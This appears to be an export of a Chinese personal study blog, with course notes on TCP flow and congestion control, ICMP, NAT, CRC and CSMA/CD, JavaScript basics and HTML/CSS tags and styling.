已确认的数据的大小\n\n发送窗口大小 = min{ 拥塞窗口， 接收窗口 }\n\n\n\n确认重传的方式：\n\n当传输过程中出现了报文段丢失，需要重新传输\n\n* 回退方式（Go-back-N, GBN）：假设丢失了第2个报文段，不管之后的报文段是否已正确接收，从第2个报文段的第1个字节序号151开始，重发所有的4个报文段。即重新发送包含确实段的整个报文，显然，效率低下！\n* 选择重发（Selective Acknowledgment，SACK）：接收方收到不连续的字节时，如果这些字节的序号都在接收窗口之内，则首先接收缓存这些字节，并将丢失的字节流序号通知发送方，发送方只需重发丢失的报文段，而不需要重发已经接收的报文段。\n\n\n\n超时重传机制：\n\n**重传定时器：**处理报文确认与等待重传的时间。发送一个报文，将其副本放入重传队列\n\n定时器的时间应当如何设置？\n\n* 如果把超时重传时间设置得**太短**，就会引起很多报文段**不必要的重传**，使网络==负荷增大==；\n\n* 但若把超时重传时间设置得**过长**，则又使网络的**空闲时间增大**，==降低了传输效率==。\n\n* 定时器设置与报文段往返时间**RTT**紧密相关。RTT表示一个报文段自发出到收到ACK的时间间隔。\n\n##### RTT的特点\n\n* RTT随网络状态而**随机**波动，既<u>非定值，也无规律</u>\n\n* 发送数据报的**同时**，需要对该报文的RTT进行估计\n\nRTT计算的方法（*不要求掌握）：\n\n<img src=\"计算机网络复习笔记/image-20230514102322494.png\" alt=\"image-20230514102322494\" style=\"zoom: 50%;\" />\n\n\n\n#### TCP流量控制与拥塞控制\n\n##### 流量控制\n\n由发送方控制发送速率，使之不超过接收速率，防止接收方来不及接收字节流，而出现报文丢失现象\n\n基本流程：\n\n触发零窗口事件的流量控制基本事件逻辑：\n\n**1)** **零窗口**(Zero window)**通告**\n\n当TCP接收方的缓冲区满(如应用层未能及时提取数据)，则接收方往发送方发送**纯ACK报文段**(数据长度=0，窗口字段=0)，称之为零窗口通告\n\n**2) 窗口更新(Window update)**\n\n当接收方缓冲区==从满状态变到有可用空间==时，接收方向发送方发送纯ACK报文段(数据长度=0，窗口字段>0)，称之为窗口更新\n\n**3) 窗口探测(Window probe)**\n\n因为纯ACK报文段(数据长度=0, ACK=1的报文段)不被TCP可靠递送，则第2步的窗口更新有**可能在网络中丢失**，导致收发双方都处于等待的死锁状态。\n\n为避免活锁，发送方使用一种叫**坚持定时器(persist timer)**来定期触发：发送方往接收方发送窗口探测报文段(数据长度>0, 保证被TCP递送)。作为响应，<u>接收方将自己的缓冲区可用空间大小放入ACK报文段的窗口字段</u>，由此，发送方获知接收方是否能继续接收数据。\n\n![image-20230514102739461](计算机网络复习笔记/image-20230514102739461.png)\n\n红字1：**零窗口通告**：纯ACK报文段，数据长度=0，窗口字段**=0**\n\n红字2：**窗口更新**：纯ACK报文段，数据长度=0，窗口字段=0\n\n红字3：**窗口探测**：纯ACK报文段，数据长度=0，ACK=1，发送方发送\n\n\n\n##### 拥塞控制\n\n拥塞现象：当多个主机端点通过TCP向整个网络注入数据时，TCP如果不对注入数据的速率进行控制，将导致整个网络出现拥堵：\n\n* 往返时延增大导致TCP重传，进一步增加拥堵\n\n* 中间路由器的缓冲容量有限。当IP数据报的到达率持续超过发出率时，中间路由器的缓冲变满, 只好丢弃新进的数据包，导致TCP重传。\n\n<img src=\"计算机网络复习笔记/image-20230514103001315.png\" alt=\"image-20230514103001315\" style=\"zoom: 80%;\" />\n\n拥塞判定：\n\n1）**重传定时器超时**\n\n现在通信线路的传输质量一般都很好，因传输出差错而丢弃分组的概率是很小的（远小于 1 %）。只要出现了超时，就可以猜想网络可能出现了拥塞)\n\n2）**收到三个相同（重复）的** **ACK**\n\n个别报文段会在网络中丢失，预示可能会出现拥塞（实际未发生拥塞），因此可以尽快采取控制措施，避免拥塞\n\n\n\n拥塞控制：慢开始，拥塞避免，快重传，快恢复\n\n<img src=\"计算机网络复习笔记/image-20230514103147641.png\" alt=\"image-20230514103147641\" style=\"zoom: 67%;\" />\n\n* 慢开始：\n\n  * 慢开始阔值SST：慢开始阶段和拥塞避免阶段的分界线，初始值有算法设定\n\n  * 慢开始阶段：==cwnd≤SST==。在该阶段，cwnd初始值为1，且每结束一个RTT，cwnd**翻倍**\n\n  * 当==cwnd=SST==时：进入拥塞避免阶段\n\n* 拥塞避免：发生拥塞时，Tahoe版本进入慢开始，Reno版本直接进入快恢复\n\n  **<img src=\"计算机网络复习笔记/image-20230514103412344.png\" alt=\"image-20230514103412344\" style=\"zoom: 50%;\" />、**\n\n* 快重传：发送方连续收到3个ACK确认后执行\n\n  <img src=\"计算机网络复习笔记/image-20230514103552160.png\" alt=\"image-20230514103552160\" style=\"zoom:50%;\" />\n\n  * “快重传”规定：接收方应及时向发送方连续3次发出对M2的“重复确认”，要求尽早重传未被确认的报文\n\n  * 当发送方接收到重复的**ACK**时，立即重传丢失的报文段M3，而不必等到M3的重传定时器超时才重传\n\n  * TCP Tahoe版和TCP Reno版都支持快重传\n\n* 快恢复：TCP Reno版在发生拥塞事件时，<u>将cwnd减半，直接进入拥塞避免阶段</u>\n\n\n\n\n\n\n\n\n\n## 网络层\n\n网络层提供：主机之间的**不可靠的，无连接的**分组传输服务。\n\n获取HTTP服务器地址：DNS协议\n\n\n\n### ICMP\n\n常见ICMP报文的类型：\n\n* 路由重定向：用于通知发送方，数据报应该通过不同的网关进行传输。其中，代码字段指定了新的网关地址。\n* 目的不可达：用于通知发送方，目标主机或目标网络不可达。其中，代码字段可以表示具体的原因，如目标主机未响应、目标网络不可达等。\n* 源站抑制：用于通知发送方，由于网络拥塞或其他原因，接收方无法处理所有接收到的数据报。发送方应该减缓发送速度，以避免发送过多的数据报。\n* 超时：用于通知发送方，数据报的 TTL（生存时间）已经减至 0，导致数据报被丢弃。\n\n上述几种报文类型也是ICMP差错报文的主要内容。\n\n<img src=\"计算机网络复习笔记/image-20230629171138579.png\" alt=\"image-20230629171138579\" style=\"zoom:67%;\" />\n\n\n\n* PING指令使用了ICMP报文，但并没有使用差错报文。\n\n\n\n路由器没有定义缺省路由，当接收ip不在路由表中时，将会采取如下策略：丢弃数据报或发送ICMP不可达消息。\n\n\n\n### NAT技术\n\n用于将私有网络中的 IP 地址映射为公共网络中的 IP 地址，以实现内部网络与外部网络的通信。\n\n* 静态NAT：一对多\n* 动态NAT：多对多\n\nNAT协议丢弃IP分组的情况：\n\n1. **未匹配到转换规则**：当 NAT 设备接收到来自内部网络或外部网络的 IP 分组时，如果未找到与该分组匹配的转换规则，那么该分组将被丢弃。\n2. **安全策略限制**：当 NAT 设备配置了安全策略时，可能会根据策略规则拦截某些 IP 分组，以保护内部网络的安全。例如，可能会拦截来自未授权的 IP 地址的分组，或者拦截包含恶意代码的分组。\n3. **资源限制**：当 NAT 设备的资源不足时，可能会丢弃某些 IP 分组，以确保设备的正常运行。例如，可能会丢弃优先级较低的分组，或者丢弃过期的分组。\n4. 转发规则限制：当 NAT 设备配置了转发规则时，可能会根据规则限制某些 IP 分组的转发。例如，可能会限制外部网络中的主机访问内部网络中的某些主机，或者限制内部网络中的主机访问外部网络的某些服务。\n\n\n\n### 路由协议\n\n* RIP协议\n\n* OSPF协议\n\n  \n\n\n\n## 链路层&物理层：\n\n数据编码技术\n\n脉冲编码调制（PCM）流程：采样→量化→编码\n\n\n\n### 链路层中的差错控制\n\n##### 差错检测与纠正\n\n* 检测：检错码，自动发现差错的编码\n\n* 纠错：纠错码，不仅能发现差错，且能够自动纠错的编码\n\n* 检错与纠错思想：在向信道发送数据前，先按照某种关系增加**冗余位**，构成码字发送。接收方收到码字后检查信息位和冗余位，进行校验以发现差错。\n\n  \n\n校验和：常用于传输层，检错码\n\n奇偶校验：较简单，检错码\n\n循环冗余校验：较复杂，检错码\n\n海明码：纠错码\n\n\n\n* 奇偶校验：在信息位最后添加一位作为校验位，使得码字中 ‘1’ 的个数为奇（偶）数。\n\n\n\n#### CRC校验\n\n#CRC校验码可以检测出所有的单比特错误\n\n![image-20230627220725495](计算机网络复习笔记/image-20230627220725495.png)\n\n步骤：\n\n1、选取生成多项式，根据该多项式的最高次项对原数据进行左移（例如最高次项为4次，则左移4位），后面多出的位数为冗余位，用于循环校验。\n\n2、将左移后的数据**模2除**上述生成多项式，得到的余数即为冗余码，发送的时候将原数据+冗余码一并发送。\n\n具体样例见上图\n\n<img src=\"计算机网络复习笔记/image-20230627221129768.png\" alt=\"image-20230627221129768\" style=\"zoom:50%;\" />\n\n\n\n![image-20230627221202853](计算机网络复习笔记/image-20230627221202853.png)\n\n![image-20230627221216999](计算机网络复习笔记/image-20230627221216999.png)\n\n\n\n\n\n###### Ipv6\n\nIpv6分组的结构：基本头、扩展头部、数据\n\n\n\n### 介质控制访问\n\n* **定义：**用来决定广播信道中**信道分配**的协议，属于数据链路层的一个子层，称为介质访问控制（Medium Access Control，MAC）子层\n\n* **任务：**为使用介质的每个节点隔离来自同一信道上其它节点所传送的信号，以协调活动节点的传输\n\n* **分类：**\n\n信道划分介质访问控制：**频分多路复用**、**时分多路复用**、波分多路复用、码分多路复用 【**静态划分**】\n\n随机访问介质访问控制：ALOHA、**CSMA/CD**、CSMA/CA  【**动态划分**】\n\n轮询访问介质访问控制：令牌传递协议 \n\n\n\n* 频分多路复用（FDMA）：\n\n  将基带信号调制到不同频率载波上再进行叠加形成一个复合信号的技术\n\n  一般需引入“保护频带”\n\n  效率高、技术成熟、易实现\n\n  <img src=\"计算机网络复习笔记/image-20230627213313345.png\" alt=\"image-20230627213313345\" style=\"zoom:50%;\" />\n\n* 时分多路复用（TDMA）\n\n  将物理信道按照时间分成若干个时间片，轮流地分配给多个信号使用\n\n  每个时间片由复用的一个信号占用\n\n  **统计时分复用**是一种改进，不固定地分配时隙，而是**按需动态分配**时隙\n\n  <img src=\"计算机网络复习笔记/image-20230627213344610.png\" alt=\"image-20230627213344610\" style=\"zoom:50%;\" />\n\n\n\n#### CSMA/CD\n\n**Carrier sense medium access/ collision detection**\n\nCSMA/CD技术十六字真言：\n\n* 先听后发：监听到总线空闲才发送数据\n\n* 边听边发：监听到空闲开始发，听是为了判断是否发生碰撞\n  * 碰撞：不同用户发送的数据在信道混叠\n\n* 冲突停止：发生冲突停止数据发送\n\n* 延迟重发：发生冲突后进行延迟重发\n\n\n\n##### 冲突窗口\n\n<img src=\"计算机网络复习笔记/image-20230627214159943.png\" alt=\"image-20230627214159943\" style=\"zoom: 67%;\" />\n\n定义：2D（Distance）/ V（传输速度），即发送数据到发生冲突的节点并接收到发生冲突的时间\n\n#这里的冲突域窗口的定义应是主机发送数据后能够接收到发生冲突信息的时间\n\n冲突域窗口时间不能小于数据帧发送时间，即接收到冲突的时间应该在数据发送完毕后。\n\n冲突域时间最小值：冲突点位于两台主机中间\n\n冲突域时间最大值：冲突点位于某一主机附近\n","tags":["计算机网络"],"categories":["计算机网络"]},{"title":"JS学习笔记","url":"/2023/01/02/JS学习笔记/","content":"\n# JS学习笔记\n\n当时学前端课写的一点js笔记，搬运一下。\n\n<!-- toc -->\n\n##### JS的特点\n\n* 1.简单性(小程序、无须编译、解释性、<u>弱数据类型</u>)\n\n* 2.安全性( Browser无法访问本地硬盘数据/写入到数据库)\n\n* 3.动态性（JS可以直接对用户提交的信息作出回应）\n\n* 4.跨平台性（支持JS的Browser）\n\n\n\n#### JS基础\n\n##### JS可以放置的地方：\n\nJavaScript代码放置有4种情形:\n\n* (1)头部\n\n  ```html\n  <head>\n  <title>调用head中定义的JavaScript函数</title>\n  <script type=\"text/javascript\">\n  function message() {\n      alert(\"调用head中定义的JavaScript函数！\");\n  }\n  </script>\n  </head>\n  ```\n\n  > JS脚本插入在头部时，JavaScript通常需要定义为函数格式，格式：\n  >\n  > function 函数名(参数1,参数2,…，参数n){函数体语句;}。\n\n* (2主体\n\n  ```html\n  <body>\n  <script type=\"text/javascript\" >\n    alert(“JS放置在主体中，直接运行！”);\n  </script>\n  </body>\n  ```\n\n  > JS脚本插入在主体时，JavaScript语句能够被立即执行。<u>也可以定义成函数，但必须引用才能执行。</u>\n\n* (3)单独的js文件\n\n  导入js文件：\n\n  ```html\n  <script type=\"text/javascript\" src=\"demo.js\"></script>\n  ```\n\n  js文件内部：\n\n  在单独js文件内写js不需要包上scripts标签\n\n  ```js\n  /*-- demo.js */\n  function message() {\n     alert(\"调用外部js文件中的函数！\");\n  }\n  ```\n\n  在html中使用：\n\n  ```html\n  <input name=“btnCallJS” type=“button” onclick=“message();\" value=\"调用外部js文件的JavaScript函数\">\n  \n  ```\n\n* (4)直接在事件处理代码中\n\n  ```html\n  <input type=\"button\" onclick=\"alert('直接在事件处理代码中加入JavaScript代码')\" value=\"直接调用JavaScript代码\">\n  ```\n\n  \n\n##### JS引用\n\n引用外部js文件：\n\n```html\n<script type=\"text/javascript\", src=“外部JS文件”></script>\n```\n\nhtml中引用js的函数（如在点击按钮后）：\n\n如下面就是在按钮上引用js函数，在onclick参数后引用js函数名\n\n```html\n<input type=button value=test onclick=\"TestJS()\"> \n```\n\n\n\n\n\njs语句：发送给浏览器的命令，这些命令的作用是告诉浏览器要做的事情。\n\n多个语句构成语句块，用花括号包住\n\n\n\n##### JS消息对话框\n\n* 警告框： alert (message）\n\n  弹出警告信息，需要确认\n\n  确定按钮必须响应，否则屏蔽一切操作。告警信息为纯文本信息或字符串，不能含有HTML标记。\n\n  \n\n* 确认框：confirm (message) \n\n  可以选择确认或取消，返回值为bool值\n\n  \n\n* 提示框\n\n  prompt (text, defaultText)： 第一个参数为提示信息，第二个参数为默认输入\n\n  ```js\n  function disp_prompt() {\n     var name=prompt(\"请输入您的姓名\",\"李田所\");\n     if (name!=null && name!=\"\") \n     {\n     document.write(\"您好，\" + name + \"!\"); \n     }\n  }\n  ```\n\n\n\n###### JS注释\n\njs的注释规则和c基本相同，在此不多赘述\n\n\n\n##### JS标识符\n\n标识符是计算机语言中用来表示变量名、函数名等的有效字符序列，简单来说，标识符就是一个名字\n\nJavaScript关于标识符的规定如下：\n\n(1)必须使用字母或者下划线开始。\n\n(2)必须使用英文字母、数字、下划线组成，不能出现空格或制表符。\n\n(3)不能使用JavaScript关键字与JavaScript保留字。\n\n(4)不能使用JavaScript语言内部的单词，比如Infinity，NaN，undefined等。\n\n(5)==大小写敏感，==如name和Name是不同的两个标识符。\n\n\n\n##### JS数据类型\n\nJavaScript中的数据类型可分为**字符型、数值型、布尔型、Null、Undefined和对象**六种类型。\n\n* Null : null,表示空,不是0，0是有值的。\n* Undefined：变量创建后未赋值（数字：NaN；字符串：Undefined；Boolean:false） 。\n\n数据类型之间可以通过函数进行转换，转换函数如下：\n\n```js\nNnumber(value)  //把值转换成数字（整型或浮点数）\nString(value)  //把值转换成字符串\nBoolean(value)  //把值转换成Boolean类型\n```\n\n\n\n##### JS运算符\n\nJS运算符中不同的地方：\n\n```js\n==，！=    //只比较数值，不比较类型\n\n===, !==    //比较数值和类型\n```\n\n* 一些特殊的比较关系运算\n\n  ```js\n  null== undefined    //true\n  NaN\" == NaN    //false\n  false == 0    //true\n  null == 0    //false\n  NaN != NaN    //true\n  true == 1    //true\n  undefined == 0    //false\n  NaN == NaN    //false\n  true == 2    //false\n  5 == NaN    //false\n  \"5\" == 5    //true\n  ```\n\n* 位移运算符\n\n  ```js\n  >>    //有符号右移\n  >>>   //无符号右移\n      \n  两者区别提现在负数操作中\n  对正数进行操作时：\n  10>>1\n  /*结果:5*/\n  10>>>1\n  /*结果:5*/\n  \n  对负数进行操作时：\n  -2>>1\n  /*结果:-1*/\n  -2>>>1\n  /*结果:2147483647*/\n  ```\n\n* 条件运算符，表达式：\n\n  格式：变量=布尔表达式 ? 真值表达式 : 假值表达式\n\n  > 和c基本一样（\n\n* 新建对象：new\n\n* 删除对象：delete\n\n* 类型运算符：typeof()\n\n\n##### JS程序控制结构\n\n* 顺序结构\n\n* 分支结构：if、if...else if...else  if...else...、switch\n\n* 循环：for、while、do...while（与c中的循环结构相同）\n\n  for - in循环：该循环用来对<u>数组或对象的属性</u>进行操作\n\n  ```js\n  for (变量 in 对象){\n      执行代码； \n  }\n  ```\n\n\n\n#### JS常用系统函数\n\n* eval（字符串表达式）\n\n  返回值：表达式的值或undefined\n\n* escape(字符串)：返回字符串的编码\n\n  可以对空格、标点符号及其他非ASCII字母表的字符进行编码，除了以下字符：“* @ - _ + . / ”\n\n* unescape (string)：返回字符串ASCII码\n\n  参数string包含形如“<u>%xx</u>”的字符的字符串，此处xx为两位十六进制数值。\n\n* parseFloat(string)：返回实数\n\n* parseInt(numbestring , radix)：将不同进制的数字转化为十进制Int类型，radix为进制\n\n* isNaN(testValue)：判断是否为数值\n\n\n\n##### JS自定义函数\n\n基本语法：function functionName(参数1， 参数2， 参数3 ......) {  函数主体  }\n\n> 注：\n>\n> 不能在其他语句或其自身中嵌套function语句，也就是说，每个函数声明都是独立的。\n>\n> 由于js是弱类型脚本语言，函数的参数没有类型检查和类型限制，要求编程者自查。\n\n每一个函数体内都内置地存在着一个对象==arguments==，它是一个类似数组的对象，通过它可以查看函数当前有几个传递来的参数（并非定义的形式参数），各个参数的值是什么。\n\n```js\nfunction sum(x,y){return x*y;}\nfunction showMessage(mess){alert(mess);}  //输出函数args的信息\n```\n\n\n\n#### JS函数变量作用域\n\n* 局部变量：局部变量是指在函数内部声明的变量，只能在一段程序中发挥作用的变量；\n\n* 全局变量：全局变量是指在函数之外声明的变量，在整个JavaScript代码中都可以发挥作用的变量，全局变量的生命周期从声明开始，在页面关闭时结束。\n\n* 局部变量和全局变量可以重名，在函数体中，局部变量的优先级高于全局变量，同名的全局变量被隐藏\n\n  > 注： 专用于函数体内部的变量一定要用**var**关键字声明，否则该变量将被定义成全局变量，如果函数体外部有同名的变量，可能导致该全局变量被修改。\n\n\n\n\n\n* pycharm中Python文件使用外部js：\n\n  > 文件 > 设置 > Plugins > 安装Node.js\n  >\n  > ​\t\t设置node环境变量：\n  >\n  > ​\t\t\t\t设置 > Language & Frameworks > Node.js > Node interpreter中路径改为nodejs的安装路径 > 重启即可运行js程序和使用npm\n\n  * 安装第三方库：npm install xxx\n    * 常用解密库：'crypto-js'  (npm install crypto-js)\n\n​\t\t\n","tags":["前端","JavaScript"],"categories":["前端"]},{"title":"HTML & CSS学习笔记","url":"/2023/01/01/HTML-CSS学习笔记/","content":"\n# HTML & CSS 学习笔记\n\n当时学web前端课的时候写的笔记，搬运一下。\n\n<!-- toc -->\n\n## HTML\n\n## 简介\n\n> - 超文本标记语言（英语：HyperText Markup Language，简称：HTML）是一种用于创建网页的标准==**标记语言**== 。\n> - - 标记语言：标记语言是一套**标记标签** (markup tag)\n\n#####html的作用：\n\n- HTML 使用标记标签来**描述**网页\n\n##### html文档的后缀名\n\n> - .html\n\n> - .htm\n\n\n\n***\n\n## 一个完整的HTML页面包括什么？\n\n- HTML 文档包含了HTML**标签** 及**文本**内容\n\n  ##### 标签：\n\n  标签是由==尖括号==包围的关键词，并且是==成对==出现的，其中第一个为开始标签（起始标签），第二个为结束标签（闭合标签）。\n\n  > 注：结束标签前比开始标签多了一个 '/'\n\n\n\n### HTML网页结构\n\n> - 1、头部声明：声明为HTML5文档\n>\n> - - <!DOCTYPE>声明不区分大小写\n>\n>   - 几种通用声明\n>\n>   - - HTML5：\n>\n>       ```html\n>       <!DOCTYPE html>\n>       ```\n>\n>     - HTML 4.01\n>\n>       ```html\n>       <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n>       \"http://www.w3.org/TR/html4/loose.dtd\">\n>       ```\n>\n>     - XHTML 1.0\n>\n>       ```html\n>       <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\n>       \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n>       ```\n>\n> \n>\n> \n\n\n\n> - 2、文档主体\n>\n> - - 头部元素\n>\n>   ```html\n>   <html>\n>     <head>\n>       <meta charset=\"utf-8\">\n>       <meta charset=\"gbk\">\n>       <title>逸一时误一世</title>\n>     </head>\n>   </html>\n>   ```\n>\n> - - - <html>为HTML页面的根元素\n>\n>   - - <head>元素包含了文档元数据（==meta== ）\n>\n>   - - - 例如$\\textcolor{green}{<meta charset=\"UTF-8\">}$为定义网页编码格式为UTF-8\n>\n>       - > 注：中文网页需要用UTF-8编码或gbk编码\n>\n>   - - <title>元素为文档标题\n>\n>   - 可见的页面内容\n>\n>   - > ==注：只有<body>区域才会在浏览器中显示== \n>\n>   - ```html\n>     <body>\n>       <h1>标题1</h1>\n>       <p1>段落1</p1>\n>     </body>\n>     ```\n>\n>   - - <body>元素包含范围内为可见页面内容\n>     - <h>元素定义一个标题\n>     - <p1>元素定义一个段落\n>\n> - > 注：在浏览器中使用F12可以开启网页调试模式\n\n\n\n### HTML元素\n\n///\n\n* 横线\n\n  ```html\n  <hr>\n  <hr color=\"red\"> //红色横线\n  ```\n\n* 几个特殊符号的显示： \n\n  ```html \n  &nbsp //空格\n  &copy //©\n  &lt  //小于号\n  &gt //大于号\n  &amp //&\n  ```\n\n  \n\n##### 网页语言格式：\n\n```html\n<html lang=\"en\">\n</html> \n```\n\n##### 行对齐格式：\n\n```html\n<h align =\"left\">abc</h> //左对齐\n<h align = \"right\">114514</h> //右对齐\n<h align =\"center\">1919810</h> //居中对齐\n```\n\n####字体格式：\n\n#####基本格式：\n\n```html\n<b></b> //字体加粗\n<em></em> //强调，一般为斜体\n<i></i> //斜体\n<mark></mark> //荧光标记\n<small></small> //缩小\n<strong></strong>\n<sub></sub> //下标 \n<sup></sup> //上标\n\n<s></s> //加删除线\n<strike></strike>  //加删除线\n```\n\n ##### 其他格式：\n\n###### font标签：\n\n```html\n<font color=\"blue\"></font> //颜色\n<font size=\"5\"></font> //字体大小\n<font face=\"KaiTi\"></font> //字体类型（楷体）\n```\n\n###### adress标签\n\n定义文档作者/所有者的联系信息。\n\n如果 <address> 元素位于 <body> 元素内部，则它表示该文档作者/所有者的联系信息。\n\n如果 <address> 元素位于 <article> 元素内部，则它表示该文章作者/所有者的联系信息。\n\n<address> 元素的文本通常呈现为*斜体*。大多数浏览器会在该元素的前后添加换行。\n\n\n</address>\n\n上面一行为adress标签的显示效果\n\n\n\n\n\n#### 列表\n\n##### 无序列表\n\n```html\n<ul>\n    <li>line1</li>\n    <li>line2</li>\n</ul>\n//默认为圆点标记\n<ul type =\"square\">\n    <li>line</li>\n</ul>\n//记号改为正方形标记\n```\n\n<img src=\"HTML-CSS学习笔记/image-20220917151128553.png\" alt=\"image-20220917151128553\" style=\"zoom:50%;\" />\t\n\n效果如上图\n\n##### 有序列表\n\n```html\n<ol>\n    <li>line1</li>\n    <li>line2</li>\n    <li>line3</li>\n</ol>\n```\n\n<img src=\"HTML-CSS学习笔记/image-20220917151841509.png\" alt=\"image-20220917151841509\" style=\"zoom:50%;\" />\t\n\n效果如图\n\n#### div标签\n\n* 在div元素之间的段落或文字将会以div标签设置的格式展现，如下方示例中，div标签内的段落或文字将会变为红色\n\n  ```html\n  <div style = \"color:red\">\n      \n  </div>\n  ```\n\n\n\n##### Span标签\n\n* 在一个文段中特定的设置某些文字的格式\n\n  ```html\n  <p>我的母亲有 <span style=\"color:blue;font-weight:bold\">蓝色</span> 的眼睛，我的父亲有 <span style=\"color:darkolivegreen;font-weight:bold\">碧绿色</span> 的眼睛。</p>\n  ```\n\n  效果：\n\n  ![image-20221008202444575](HTML-CSS学习笔记/image-20221008202444575.png)\t\n\n#### table元素：表格\n\n* 在网页中创建一个表格\n\n  ```html\n  <table border = \"1\">//table标签，表格主体 border为表格边框粗细\n      <tr>//table row列\n        <td></td>//行元素\n      </tr>\n  </table>\n  ```\n\n* colspan属性：表格跨列合并操作\n\n* rowspan属性：表格跨行合并操作\n\n* align属性：水平对齐\n\n* valign属性：垂直对齐\n\n\n\n#### map标签和area标签（点击跳转）\n\n* map标签：划定一块区域作为map区域\n\n* area：声明map区域内的一块区域为area区域，包含三个属性\n\n  * href Attibute ：区域的跳转链接\n  * shape Attribute ： area的形状（参数可为rectangle, circle, or polygon）\n  * coords Attribute：area的坐标\n\n* 示例：\n\n  ```html\n  <map name=\"boat\" id=\"boat\">\n  <area href=\"http://www.doorcountyvacations.com\" shape=\"rect\" \n  coords=\"24, 188, 339, 283\" alt=\"Door County Fishing\">\n  </map>\n  <img src=\"fishingboat.jpg\" usemap=\"#boat\" alt=\"Door County“\n  width=\"416\" height=\"350\">\n  ```\n\n  <img src=\"HTML-CSS学习笔记/image-20221013192107892.png\" alt=\"image-20221013192107892\" style=\"zoom:50%;\" />\n\n\n\n\n\n#### 段落和其他格式设置\n\n* style标签和class的使用//css\n\n  在style标签中可以定义对应段落标签内部内容的格式，使用方式如下：\n\n  ```html\n  <style>\n      h{letter-spacing:50px} //字间距\n      .text{text-indent:50px} //首行缩进\n  </style>\n  \n  <h>114514</h>\n  <p class = \"text\"> 1919810</p>\n  ```\n\n\n\n\n#### html超链接\n\n##### 网页文本内部跳转\n\n​\t\t网页内部跳转需要索引\n\n* ```html\n  <a href =\"#abc\">xxx</a>//跳转超链接加上#\n  ......\n  <p id =\"abc\">//id为要跳转到的标签\n      ABC\n  </p>\n  ```\n\n##### 跳转到外部文件/网页\n\n* ```html\n  <a href =\"url\">xxx</a>\n  ```\n\n\n\n### HTML表单：页面动态化\n\n#### form标签\n\n> from标签中绝大多数的内容是input\n\n##### input标签\n\ntype类型全部参数见：https://www.runoob.com/tags/tag-input.html\n\n##### textarea标签\n\ntextarea标签定义一个多行的文本输入控件\n\n尺寸大小调节：使用 CSS 的 height 和 width 属性\n\n\n\n### 在vscode中调试html网页\n\n#### Live Server插件\n\n* 在插件中安装LIve Server插件\n\n##### 使用Live Server可能出现的一点问题\n\n* 点击Open With Live Server后在浏览器中没有正常显示页面而是出现 listing directory / 页面\n\n  <img src=\"HTML-CSS学习笔记/image-20220917145547233.png\" alt=\"image-20220917145547233\" style=\"zoom:67%;\" />\t\n\n  解决方法：出现此问题的原因是在vs中创建新文件的时候没有确定文件格式，重命名添加文件后缀.html后即可正常显示网页\n\n## CSS\n\n* CSS标签格式（在style标签中）：\n\n  Selector + declaration property  + declaration value\n\n  ```css\n  body{color:blue}\n  ```\n\n​\t\t其中Selector可以是class标签或id标签，class格式为.开头，id格式为#开头\n\n```css\n<style>\n.aaa{\n    clolr:red\n    ...\n}\n\n#id{\n    color:blue\n    ...\n}\n</style>\n```\n\n       ```html\n       <div class=\"aaa\"></div>\n       <div id=\"bbb\"><div>\n       ```\n\n* CSS ==Contextual Selector==\n\n  ```css\n  <style>\n  #footer a { color: #00ff00; }\n  </style> \n  ```\n\n格式：id的style中有两个标签名，前一个为id名，后一个为前面id范围内要控制的标签的格式名\n\n```html\n<div id=\"footer\">\n    <a href=\"...\">abc</a>  //这个anchor标签会变色\n</div>\n\n<a href=\"...\">outside</a>  //这个anchor标签不会受到影响\n```\n\n\n\n#### 文字属性 \n\n* 字体：font-family\n\n  ```css\n  font-family: Georgia, \"Times New Roman\", serif；\n  ```\n\n* 水平对齐：text-align\n\n  ```css\n  text-align: center;\n  ```\n\n\n* 字体大小\n\n  ```css\n  font-size:150% //1.5倍大小\n  ```\n\n* 字体粗细\n\n  ```css\n  font-weight:200%\n  ```\n\n* 字间距\n\n  ```css\n  letter-spacing:5px;\n  ```\n\n* 行间距\n\n  ```css\n  line-height:50%; //50%行距\n  ```\n\n  \n\n\n\n\n\n#### 文字块，box属性\n\n* 背景颜色：background-color\n\n  ```css\n  background-color:#191970;\n  ```\n\n* padding属性：边衬，四周的空白区\n\n  ```css\n  padding: 15px;\n  ```\n\n* 透明度：opacity\n\n* 背景： background-image\n\n  ```css\n  background-image: url(trilliumbullet.gif);\n  ```\n\n* 背景图重复排列：\n\n  ```css\n  background-repeat: no-repeat; //只有一张\n  background-repeat: repeat; //有多张拼接，默认xy方向都repeat  \n  ```\n\n* 背景颜色rgb+透明度\n\n  ```css\n  rgba(255, 255, 255, 0.7); //前三个：rgb， 第四个参数：透明度（0-1）\n  ```\n\n* 向特定方向对齐：float\n\n  ```css\n  float:right;//向右端对齐\n  ```\n\n  * clear属性：终结float，使对应模块取消漂浮属性\n\n  * overflow属性：参数（auto, hidden, and scroll），auto：自动填充\n\n##### box的嵌套\n\n* 位置属性：position\n\n  ```css\n  position: relative;//相对位置\n  position: absolute;//绝对位置\n  ```\n\n  ```css\n  h1 { background-color: #cccccc;\n  \tpadding: 5px;\n  \tcolor: #000000; }\n  #content {position: absolute;\n  \tleft: 200;//左边空出200px\n  \ttop: 100;//上面空出100px\n      //绝对位置的位置设定\n  \tfont-family: Arial,sans-serif;\n  \twidth: 300; }\n  ```\n\n  <img src=\"HTML-CSS学习笔记/image-20221013195512372.png\" alt=\"image-20221013195512372\" style=\"zoom:50%;\" />\n\n\n\n##### 模块显示方式：display属性\n\n* 三种参数：none，inline，block\n\n  ```css\n  display: none //不显示\n  display: block //以块状模式显示，尽管原来的格式是线性的，如hyperlink\n  display: inline //按照线性排列，尽管原来的格式是块状的，如<ul>\n  ```\n\n###### 消去列表格式（列表前序号或点标记）\n\n```css\nlist-style-type: none;\n```\n\n\n\n\n\n\n\n#### 文字滚动\n\n##### marquee标签：\n\n###### 主要属性\n\n* bgcolor：背景颜色\n* direction：滚动方向，参数值有down、left、right、up四个单一可选值\n* behavior：滚动方式，值可以是**scroll(连续滚动)，slide(滑动一次)，alternate(来回滚动)**\n* width和height属性：滚动范围矩形大小\n* hspace， vspace：滚动区域周围的空白区域大小\n* loop：滚动循环次数，缺省为无限循环，参数值可为任意整数，为-1或infinite时无限循环\n* scrollamount：文字滚动速度，值为正整数，默认为6\n* scrolldelay：停顿时间，值为正整数，默认为0，单位毫秒\n* align：文字在框中的位置，值可为**top，middle，bottom**\n\n\n\n#### css超链接\n\n##### 超链接伪类样式\n\n* 